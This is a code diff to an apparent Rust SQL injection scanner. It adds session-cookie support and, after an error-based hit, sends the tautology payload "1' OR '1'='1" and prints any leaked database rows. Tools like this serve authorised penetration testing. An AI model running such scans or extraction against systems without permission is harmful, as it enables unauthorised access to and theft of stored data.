@@ -3,7 +3,7 @@ use crate::payloads;
 use url::Url;
 
 
-pub fn scan(target_url: &str) -> anyhow::Result<()>{
+pub fn scan(target_url: &str, cookie: Option<&str>) -> anyhow::Result<()>{
     let parsed = Url::parse(target_url)?;
     let  params: Vec<(String, String)> = parsed
         .query_pairs()
@@ -17,36 +17,49 @@ pub fn scan(target_url: &str) -> anyhow::Result<()>{
     println!("Found {} Injectable parameters", params.len());
 
 
-    let baseline = http::get(target_url)?;
+    let baseline = http::get(target_url, cookie)?;
     println!("Baseline: status= {}, body_len={}, time={}ms", baseline.status, baseline.body.len(), baseline.response_time_ms);
     for (param_name, original_value) in &params {
         println!("\n--- Testing Param: {} ---", param_name);
         for payload in payloads::error_based()  {
             let injected_url = replace_param(target_url, param_name, payload)?;
-            let res = http::get(&injected_url)?;
-            
+            let res = http::get(&injected_url, cookie)?;
+         
             if let Some(db) = super::detector::detect_error_based(&res.body) {
                 println!("[VULN] Error-based SQLi | param: {} | DB: {} | payload: {}", param_name,db, payload);
+               
+                let extract_url = replace_param(target_url, param_name, "1' OR '1'='1")?;
+                let extract_res = http::get(&extract_url, cookie)?;
+                let data = super::detector::extract_data(&extract_res.body);
+                if !data.is_empty() {
+                    println!("\n Leaked data: {} rows:", data.len());
+                    for row in &data  {
+                        println!("      {}", row);
+                    }
+                }
+                break;
             }
         }
         
         for (true_payload, false_payload) in payloads::boolean_blind()  {
            let true_url = replace_param(target_url, param_name, true_payload)?;
            let false_url = replace_param(target_url, param_name, false_payload)?;
-           let true_res = http::get(&true_url)?;
-           let false_res = http::get(&false_url)?;
+           let true_res = http::get(&true_url, cookie)?;
+           let false_res = http::get(&false_url, cookie)?;
         
            if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {
                println!("[VULN] Boolean-Blind SQLi | param: {} | payload: {}", param_name, true_payload);
+               break;
            }
         }
 
         for (payload, db_type) in payloads::time_blind()  {
             let injected_url = replace_param(target_url, param_name, payload)?;
-            let res = http::get(&injected_url)?;
+            let res = http::get(&injected_url, cookie)?;
 
             if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
-                println!("[VULN] Time-Blind SQLi | param: {} | DB: {} | payload: {}", param_name, db_type, payload)
+                println!("[VULN] Time-Blind SQLi | param: {} | DB: {} | payload: {}", param_name, db_type, payload);
+                break;
             }
         }
     }
